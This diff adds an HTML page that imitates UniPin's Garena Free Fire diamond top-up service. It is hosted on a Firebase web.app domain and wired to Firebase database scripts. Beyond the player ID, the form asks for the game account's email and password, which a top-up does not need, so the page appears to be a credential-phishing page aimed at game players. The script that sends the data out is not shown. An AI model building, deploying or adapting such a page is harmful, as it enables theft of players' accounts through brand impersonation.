@@ -1,0 +1,258 @@
+<html lang="en"
+    class=" sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta name="viewport" content="minimum-scale=1.0, width=device-width, maximum-scale=1, user-scalable=no">
+    <title>UniPin - Free Fire</title>
+    <meta name="application-name" content="UniPin">
+    <meta name="copyright" content="© 2020 by UniPin">
+    <meta name="keywords"
+        content="payment gateway, payment service provider, online game, indomaret, game credits, game cash ">
+    <meta name="description" content="The fastest way to get game credits online!     Top up atau beli free fire diamond garena murah dan cepat di UniPin, cukup isi ID, pilih nominal yang diinginkan, diamond langsung masuk ke akun Free Fire kamu! bisa bayar melalui Gopay, Telkomsel, Tri, dan lainnya.
+    ">
+    <meta name="csrf-token" content="XaYjJStoiz4JLWUiPSKEQMiU4Uxm0l3U8Y0kKPPH">
+    <meta name="theme-color" content="#ED6B26">
+    <link rel="manifest" href="../../manifest.json">
+    <link rel="apple-touch-icon" sizes="144x144" href="../../assets/img/unipin-square.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="../../assets/img/unipin-square.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="../../assets/img/unipin-square.png">
+    <link rel="apple-touch-icon" href="../../assets/img/unipin.png">
+    <link rel="shortcut icon" sizes="196x196" href="../../assets/img/unipin.png">
+    <link rel="shortcut icon" type="image/x-icon" href="../../assets/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="../.../assets/img/favicon.ico">
+    <meta property="og:url" content="https://unipin.web.app/games/free-fire">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="UniPin - Top up Free Fire">
+    <meta property="og:description" content="The fastest way to get game credits online!     Top up atau beli free fire diamond garena murah dan cepat di UniPin, cukup isi ID, pilih nominal yang diinginkan, diamond langsung masuk ke akun Free Fire kamu! bisa bayar melalui Gopay, Telkomsel, Tri, dan lainnya.
+    ">
+    <meta property="og:image" content="https://unipin.web.app/images/unipin-black-lg.png">
+    <meta property="twitter:description" content="The fastest way to get game credits online!     Top up atau beli free fire diamond garena murah dan cepat di UniPin, cukup isi ID, pilih nominal yang diinginkan, diamond langsung masuk ke akun Free Fire kamu! bisa bayar melalui Gopay, Telkomsel, Tri, dan lainnya.
+    ">
+    <meta property="twitter:image" content="https://unipin.web.app/images/unipin-black-lg.png">
+    <meta property="twitter:url" content="https://unipin.web.app/garena/free-fire">
+    <link href="../../assets/css/index.css" rel="stylesheet" type="text/css">
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.10.0/firebase-analytics.js"></script>
+</head>
+
+<body class="drawer drawer--right drawer-close">
+
+    <input id="game" type="hidden" value="free-fire">
+
+    <div class="topbar">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-offset-1 col-lg-10">
+                    <div id="bar-container">
+                        <div class="top-menu top-menu-right">
+                        </div>
+                        <div class="text-center top-menu-center">
+                            <a href="/">
+                                <img class="unipin-logo" src="../../assets/img/unipin-new.png" alt="UniPin">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="topbar-offset"></div>
+    <input type="hidden" id="baseURL" value="https://unipin.web.app">
+    <div class="pageLoader"></div>
+    <div class="majorWrap">
+        <div id="ajaxArea">
+            <main role="main" class="body-pale">
+                <div class="bg-grey3">
+                    <div class="container payment-page-container">
+                        <div class="row">
+                            <div class="col-md-4 col-lg-offset-1 col-lg-4">
+                                <section class="payment-gameinfo-container">
+                                    <div class="row">
+                                        <div class="col-xs-7 col-sm-9 col-md-12">
+                                            <div class="payment-game-title-container">
+                                                <h1 class="payment-game-title payment-game-title-1 c-orange text-left">
+                                                    Free Fire<br>
+                                                </h1>
+                                                <h3 class="payment-game-title payment-game-title-3 c-orange text-left">
+                                                    Garena</h3>
+                                            </div>
+                                        </div>
+                                        <div
+                                            class="col-xs-5 col-sm-3 col-md-12 payment-game-image-container text-right">
+                                            <img class="box-shadow-3 payment-game-image"
+                                                src="../../assets/img/free-fire.jpg" alt="Free Fire" title="Free Fire">
+                                        </div>
+                                        <div
+                                            class="col-xs-5 col-sm-3 col-md-12 payment-game-image-container text-right">
+                                            <img src="../../assets/img/transparent.jpg">
+                                        </div>
+                                        <div
+                                            class="col-xs-5 col-sm-3 col-md-12 payment-game-image-container text-right">
+                                            <img src="../../assets/img/transparent.jpg">
+                                        </div>
+                                    </div>
+                                </section>
+                            </div>
+
+                            <form id="form">
+                                <div class="payment-step-outter-container col-md-8 col-lg-6">
+                                    <div class="row">
+                                        <div class="payment-step-container">
+                                            <div class="payment-caption-container">
+                                                <div class="payment-step-bullet">
+                                                    <b>1</b>
+                                                </div>
+                                                <div class="h5 payment-caption c-grey">
+                                                    <b>Masukkan ID Pengguna</b>
+                                                </div>
+                                            </div>
+                                            <div class="form-group">
+                                                <input class="form-bracket-type-1 form-input-id form-control"
+                                                    placeholder="ID Pengguna" style="width: 100%" required id="id"
+                                                    type="tel">
+                                            </div>
+                                            <div class="help-block-id c-grey">
+                                                Anda bisa mendapatkan Player ID di bawah username Anda setelah Anda
+                                                menekan gambar avatar di kiri atas layar.
+                                            </div>
+                                        </div>
+                                        <div class="loading" style="display:none;">Memuat...…</div>
+                                    </div>
+                                </div>
+                                <div class="payment-step-outter-container col-md-8 col-lg-6">
+                                    <div class="row">
+                                        <div class="payment-step-container">
+                                            <div class="payment-caption-container">
+                                                <div class="payment-step-bullet">
+                                                    <b>2</b>
+                                                </div>
+                                                <div class="h5 payment-caption c-grey">
+                                                    <b>Masukkan Email Akun</b>
+                                                </div>
+                                            </div>
+                                            <div class="form-group">
+                                                <input class="form-control" autocomplete="email"
+                                                    placeholder="Email Akun" style="width: 100%" id="email" type="text"
+                                                    required>
+                                            </div>
+                                        </div>
+                                        <div class="loading" style="display:none;">Memuat...…</div>
+                                    </div>
+                                </div>
+                                <div class="payment-step-outter-container col-md-8 col-lg-6">
+                                    <div class="row">
+                                        <div class="payment-step-container">
+                                            <div class="payment-caption-container">
+                                                <div class="payment-step-bullet">
+                                                    <b>3</b>
+                                                </div>
+                                                <div class="h5 payment-caption c-grey">
+                                                    <b>Masukkan Password Akun</b>
+                                                </div>
+                                            </div>
+                                            <div class="form-group">
+                                                <input class="form-control" autocomplete="current-password"
+                                                    placeholder="Password Akun" style="width: 100%" id="pass"
+                                                    type="password" required>
+                                            </div>
+                                        </div>
+                                        <div class="loading" style="display:none;">Memuat...…</div>
+                                    </div>
+                                </div>
+                                <div class="payment-step-outter-container col-md-8 col-lg-6">
+                                    <div class="row">
+                                        <div class="payment-step-container">
+                                            <div class="payment-caption-container">
+                                                <div class="payment-step-bullet">
+                                                    <b>4</b>
+                                                </div>
+                                                <div class="h5 payment-caption c-grey">
+                                                    <b>Masukkan Denominasi</b>
+                                                </div>
+                                            </div>
+                                            <div id="form-webtopup" class="form-inline-nomargin form-inline">
+                                                <div class="form-group">
+                                                    <input class="form-bracket-type-1 form-input-id form-control"
+                                                        placeholder="Jumlah Diamond" style="width: 100%" required
+                                                        type="tel">
+                                                </div>
+                                                <div class="form-group">
+                                                    <div class="btn btn-up-orange help-block-id">
+                                                        <span>FreeFire Diamond</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="loading" style="display:none;">Memuat...…</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="payment-step-outter-container col-md-8 col-lg-6">
+                                    <div class="form-group">
+                                        <button id="send" class="col-md-12 btn btn-up-orange" type="submit"">Kirim</button>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+            </main>
+
+            <br>
+            <br>
+        </div>
+        <footer class=" bg-gradient-orange">
+            <div class="footer-social-media bg-black-2">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="footer-blackline-container" id="footer" style="display: inline;">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+    <div class="drawer-overlay drawer-toggle"></div>
+    <ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content ui-corner-all" id="ui-id-1" tabindex="0"
+        style="display: none;">
+    </ul>
+
+    <script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <script src=" https://cdn.firebase.com/js/client/2.2.3/firebase.js"></script>
+    <script src="free-fire/js/script.js"></script>
+    <script>
+        var a = document.getElementById("footer");
+        var newDate = new Date().getFullYear();
+        a.innerHTML = `
+        &copy ` + newDate + ` UniPin. All Rights Reserved <br>
+            <small>(Syarat dan ketentuan)</small>
+        `
+    </script>
+
+    <div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+        <div class="modal-header">
+            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+            <h3 id="myModalLabel">Modal header</h3>
+        </div>
+        <div class="modal-body">
+            <p>One fine body…</p>
+        </div>
+        <div class="modal-footer">
+            <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
+            <button class="btn btn-primary">Save changes</button>
+        </div>
+    </div>
+
+
+
+</body>
+
+</html>
